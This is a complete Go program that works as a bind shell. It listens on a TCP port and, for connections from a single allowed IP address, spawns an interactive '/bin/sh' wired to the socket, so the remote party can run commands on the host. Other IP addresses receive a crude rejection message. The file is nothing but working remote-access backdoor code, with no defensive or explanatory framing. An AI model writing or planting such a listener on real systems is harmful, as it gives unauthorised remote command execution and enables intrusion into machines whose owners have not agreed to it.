package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
)

func genHandle(allow_ip string) func(net.Conn) {
	return (func(conn net.Conn) {
		remoteAddr := conn.RemoteAddr().String()
		ip := strings.Split(remoteAddr, ":")[0]
		defer conn.Close()

		if ip == allow_ip {
			log.Printf("Received connection from %v", conn.RemoteAddr())
			cmd := exec.Command("/bin/sh", "-i")
			// This pipe takes the OUTPUT of our command and writes it to the Write Pipe
			cmd_output_reader, cmd_output_writer := io.Pipe()
			// Command stdin is fed from the connection
			cmd.Stdin = conn
			cmd.Stdout = cmd_output_writer
			// Asynchronously copies the data on the read pipe to the connection
			go io.Copy(conn, cmd_output_reader)
			//go io.Copy(os.Stdout, cmd_input_pipe)
			// Runs the command and writes the command's output to wp
			cmd.Run()
		} else {
			conn.Write([]byte("Get fucked!!\n\n"))
			log.Printf("Rejected connection from %v\n", remoteAddr)
		}
	})
}

func main() {
	port := flag.String("port", "8080", "TCP port to bind server to")
	allow_ip := flag.String("allow", "", "IP address to allow connection")

	flag.Parse()
	if *allow_ip == "" {
		fmt.Println("Must specify allowed ip")
		flag.Usage()
		os.Exit(1)
	}
	// Setup notifier for interrupt signal
	sig_chan := make(chan os.Signal, 1)
	signal.Notify(sig_chan, os.Interrupt)

	go func(c chan os.Signal) {
		<-c
		log.Println("Exiting")
		os.Exit(0)
	}(sig_chan)

	listener, err := net.Listen("tcp", fmt.Sprintf(":%s", *port))

	if err != nil {
		log.Fatalln("Unable to bind to port")
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("unable to accept connection")
		}
		go genHandle(*allow_ip)(conn)
	}
}
